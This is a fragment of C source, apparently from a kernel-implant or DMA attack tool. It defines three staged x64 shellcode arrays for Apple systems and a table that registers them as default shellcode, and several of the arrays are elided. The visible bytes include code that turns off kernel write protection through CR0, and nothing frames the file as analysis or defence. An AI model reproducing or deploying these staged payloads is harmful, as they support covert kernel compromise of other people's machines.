...
const BYTE APPLE_X64_STAGE1_BIN[] = {
	0xe8, 0xfb, 0xff, 0xff, 0xff
};

const BYTE APPLE_X64_STAGE2_BIN[] = {
	0xeb, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0x48, 0x83, 0xe8,
	0x05, 0x50, 0x57, 0x56, 0x52, 0x51, 0x41, 0x50, 0x41, 0x51, 0x0f, 0x20,
	0xc1, 0x51, 0x81, 0xe1, 0xff, 0xff, 0xfe, 0xff, 0x0f, 0x22, 0xc1, 0x48,
...
const BYTE APPLE_X64_STAGE3_BIN[] = {
	0x48, 0x8d, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x00, 0x48, 0x83,
	...
	0x00, 0x00, 0x48, 0xc7, 0x41, 0x50, 0x03, 0x00, 0x00, 0x00, 0x48, 0xb8,
	...
	0x3b, 0xc4, 0x77, 0x65, 0x33, 0xd2, 0x4d, 0x8d, 0x86, 0x00, 0x20, 0x00,
	0x00, 0x48, 0x8b, 0x4b, 0x40, 0x48, 0x03, 0xca, 0x48, 0x81, 0xc2, 0x00,
	0x10, 0x00, 0x00, 0x48, 0x83, 0xc9, 0x03, 0x49, 0x89, 0x08, 0x4d, 0x8d,
	0x40, 0x08, 0x49, 0x3b, 0xd5, 0x72, 0xe2, 0xe8, 0x76, 0xfc, 0xff, 0xff,
...
const SHELLCODE_DEFAULT_STRUCT SHELLCODE_DEFAULT[] = {
	...
	{.sz = "DEFAULT_APPLE_X64_STAGE1",.pb = (PBYTE)APPLE_X64_STAGE1_BIN,.cb = sizeof(APPLE_X64_STAGE1_BIN)},
	{.sz = "DEFAULT_APPLE_X64_STAGE2",.pb = (PBYTE)APPLE_X64_STAGE2_BIN,.cb = sizeof(APPLE_X64_STAGE2_BIN)},
	{.sz = "DEFAULT_APPLE_X64_STAGE3",.pb = (PBYTE)APPLE_X64_STAGE3_BIN,.cb = sizeof(APPLE_X64_STAGE3_BIN)}
};
